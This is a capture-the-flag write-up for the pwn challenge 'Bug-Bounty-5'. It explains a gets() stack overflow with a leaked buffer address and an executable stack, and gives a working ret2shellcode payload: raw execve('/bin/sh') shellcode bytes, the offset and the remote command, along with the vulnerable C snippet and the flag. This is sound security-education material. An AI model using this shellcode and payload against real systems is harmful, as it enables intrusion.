---
title: "Bug-Bounty-5"
ctf: "Pwny-CTF"
category: "pwn"
difficulty: "Not specified"
points: 300
techniques: ["format-string", "ret2win", "shellcode", "pie-bypass", "nx-bypass"]
tools: ["checksec", "netcat", "python"]
keywords: ["Bug-Bounty-5", "Pwny-CTF", "pwn", "format-string", "ret2win", "shellcode", "pie-bypass", "nx-bypass", "checksec", "netcat", "python", "pie", "stack"]
status: "solved"
has_script: true
source: "Pwny-CTF/CHALLENGES/PWN-I/Bug-Bounty-5/notes.md"
---

# Bug-Bounty-5 (Pwny-CTF, pwn)

## Summary
Challenge **Bug-Bounty-5** from the Pwny-CTF CTF, pwn category. Main technique: format-string. No flag function in the binary -> you have to execute code, not just redirect to an existing function. Recognize this case: the source does not contain any print_flag/win, but an executable stack (checksec: Stack: Executable/RWX).

## Statement and artefacts
Time to get serious. No more printing the flag for free.

Bug bounty: The rest of our money.

`nc chal.sigpwny.com 1347`

**author**: Akhil

**Provided files / artifacts:**
- `work/Makefile (file, 131 B)`
- `work/challenge (file, 18.7 KB)`
- `work/challenge_patched (file, 18.7 KB)`

## Recognition signals
- Signal: This time, no print_flag() to divert: the binary does not contain any function which gives the flag.
- Signal: You must execute code that you provide yourself.
- Signal: checksec confirms that it is possible: Stack: Executable / RWX: Has RWX segments.
- Signal: The stack can execute code, despite NX enabled at the kernel level (the binary forces an RWX stack regardless of this system protection).

## Resolution method
1. Read the code comment: *“We've completely removed print_flag... what can you do to get a flag yourself? »* → you have to execute a command (e.g. a shell) yourself, not just read a file already provided by the program.
2. The clue confirms: *“The stack is executable!” »* → ret2shellcode.
3. The program directly leaks `&name` (`%p` in the message), so **no need to bypass PIE**: PIE randomizes the base address of the *binary*, not that of the stack of this precise execution, and this stack address is precisely the one we are given.
4. Offset to return address: `48` (size of `name`) + `8` (saved RBP) = `56`.
5. Payload: shellcode (23 bytes, execve `/bin/sh`) + padding up to 48, then 8 padding bytes (saved RBP), then `p64(name_addr)` as return address → at `ret`, the program jumps into `name`, where the shellcode is placed.

```python
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
payload = shellcode + (48 - len(shellcode)) * b"A" + b"B" * 8 + p64(name_addr)
```

1. **Order ready**

```bash
./pwny.py --remote --host chal.sigpwny.com --port 1347
```

2. **Flaw**

```c
char name[48];
printf("What's your name? I'll store it safely at %p\n", &name);  // free leak of the buffer address
gets(name);  // overflow, no limit
```
This time, no `print_flag()` to divert: the binary does not contain any function which gives the flag. You must execute **code that you provide yourself**.

`checksec` confirms that it is possible: `Stack: Executable` / `RWX: Has RWX segments`. The stack can execute code, despite `NX enabled` at the kernel level (the binary forces an RWX stack regardless of this system protection).

## Solve script
Script path: [scripts/pwny.py](scripts/pwny.py)

## Flag
sigpwny{we_print_our_own_flags_here}

## Lessons and reusable patterns
- No flag function in the binary -> you have to execute code, not just redirect to an existing function. Recognize this case: the source does not contain any print_flag/win, but an executable stack (checksec: Stack: Executable/RWX).
- PIE doesn't prevent everything: it protects the addresses of the binary code. A stack address leaked directly by the program (like here) remains usable without having to bypass PIE.
- Hard shellcode execve("/bin/sh") (23 bytes, x86-64): keep on hand, no need to regenerate it each time.
- Same family as 3 - Execute (already done): leak of a stack address + executable stack = ret2shellcode. Here in addition, no emergency function exists in the binary, which forces this technique (not the choice of a ret2win).
